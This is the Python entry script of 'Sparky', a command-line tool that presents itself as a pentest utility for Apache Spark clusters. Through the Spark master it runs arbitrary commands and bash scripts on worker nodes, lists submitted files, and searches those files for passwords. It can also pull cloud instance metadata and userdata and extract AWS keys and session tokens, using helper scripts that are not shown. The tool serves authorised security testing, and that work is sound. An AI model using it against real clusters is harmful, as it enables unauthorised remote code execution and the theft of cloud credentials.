import argparse
from utils.common import whine, confirmSparkMaster
from utils.sparkClient import SparkClient
from utils.general import parseListNodes
from utils.cmd import parseCommandOutput
import multiprocessing
import sys, os


def isValidFile(parser, arg):
    if not os.path.exists(arg):
        parser.error("The file %s does not exist!" % arg)
    else:
        return open(arg, "r")  # return an open file handle


def main(results):
    target = results.spark_master
    port = int(results.spark_port)
    p = multiprocessing.Pool()
    sparkSession = SparkClient(target, port)
    whine("Initializing Spark...This can take a little while", "info")
    sparkSession.initContext()
    print("")
    whine(
        "Testing target to confirm a spark master is running on {0}:{1}".format(
            target, port
        ),
        "info",
    )
    if not confirmSparkMaster(sparkSession):
        whine("Could not confirm the target is running spark", "warn")

    if sparkSession.getVersion():
        msg = "Spark is running version {0}"
        whine(msg.format(sparkSession.version), "good")

    if results.listNodes:
        parseListNodes(sparkSession)

    if results.listFiles:
        interpreterArgs = [
            "/bin/bash",
            "-c",
            'find "$(cd ../..; pwd)" -type f -name "{0}" -printf "%M\t%u\t%g\t%6k KB\t%Tc\t%p\n" |grep -v stderr |grep -v stdout'.format(
                results.extension
            ),
        ]
        parseCommandOutput(sparkSession, interpreterArgs, results.numWokers)

    if results.passwdInFile:
        scriptContent = open("./utils/searchPass.py", "r").read()
        interpreterArgs = ["python", "-c", scriptContent, results.extension]
        parseCommandOutput(sparkSession, interpreterArgs, results.numWokers)

    if results.cmd:
        interpreterArgs = [results.cmd]
        parseCommandOutput(sparkSession, interpreterArgs, results.numWokers)

    if results.script:
        scriptContent = results.script.read()
        interpreterArgs = ["/bin/bash", "-c", scriptContent]
        parseCommandOutput(sparkSession, interpreterArgs, results.numWokers)

    if results.metadata:
        scriptContent = open("./utils/cloud.py", "r").read()
        interpreterArgs = ["python", "-c", scriptContent, "metadata"]
        parseCommandOutput(sparkSession, interpreterArgs, results.numWokers)

    if results.userdata:
        scriptContent = open("./utils/cloud.py", "r").read()
        interpreterArgs = ["python", "-c", scriptContent, "userdata"]
        parseCommandOutput(sparkSession, interpreterArgs, results.numWokers)

    if results.privatekey:
        scriptContent = open("./utils/cloud.py", "r").read()
        interpreterArgs = ["python", "-c", scriptContent, "privatekey"]
        parseCommandOutput(sparkSession, interpreterArgs, results.numWokers)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Sparky: a tool to pentest Spark clusters"
    )
    parser.add_argument("spark_master", help="The master node of a Spark cluster")
    parser.add_argument("spark_port", help="Spark port (usually 7077)", default=7077)

    group_general = parser.add_argument_group("General")
    group_cmd = parser.add_argument_group("Command execution")
    group_cloud = parser.add_argument_group("Cloud environment (AWS, DigitalOcean)")

    group_general.add_argument(
        "-l",
        "--list-nodes",
        help="List of executor nodes",
        action="store_true",
        default=False,
        dest="listNodes",
    )
    group_general.add_argument(
        "-f",
        "--list-files",
        help="List of files (jars, py, etc.) submited to a worker - may contain sensitive information",
        action="store_true",
        default=False,
        dest="listFiles",
    )
    group_general.add_argument(
        "-e",
        "--extension",
        help="Performs list and search operations on particular extensions of files submitted to a worker: *.txt, *.jar, *.py?. Default: *",
        default="*",
        dest="extension",
    )

    group_general.add_argument(
        "-k",
        "--search",
        help="Search for patterns in files submited to a worker. Default Patterns taken from patterns.txt",
        action="store_true",
        default=False,
        dest="passwdInFile",
    )

    group_cmd.add_argument(
        "-c", "--cmd", help="Execute a command", default=False, dest="cmd"
    )
    group_cmd.add_argument(
        "-s",
        "--script",
        help="Execute a bash script",
        type=lambda x: isValidFile(parser, x),
        default=False,
        dest="script",
    )
    group_cmd.add_argument(
        "-n",
        "--num-workers",
        type=int,
        help="Number of workers",
        default=1,
        dest="numWokers",
    )

    group_cloud.add_argument(
        "-u",
        "--user-data",
        help="Gather userdata or custom data information",
        action="store_true",
        default=False,
        dest="userdata",
    )
    group_cloud.add_argument(
        "-m",
        "--meta-data",
        action="store_true",
        help="Gather metadata information from the cloud provider",
        default=False,
        dest="metadata",
    )
    group_cloud.add_argument(
        "-p",
        "--private-key",
        action="store_true",
        help="Extracts AWS private key and session token if a role is attached to the instance (AWS only)",
        default=False,
        dest="privatekey",
    )

    results = parser.parse_args()
    main(results)
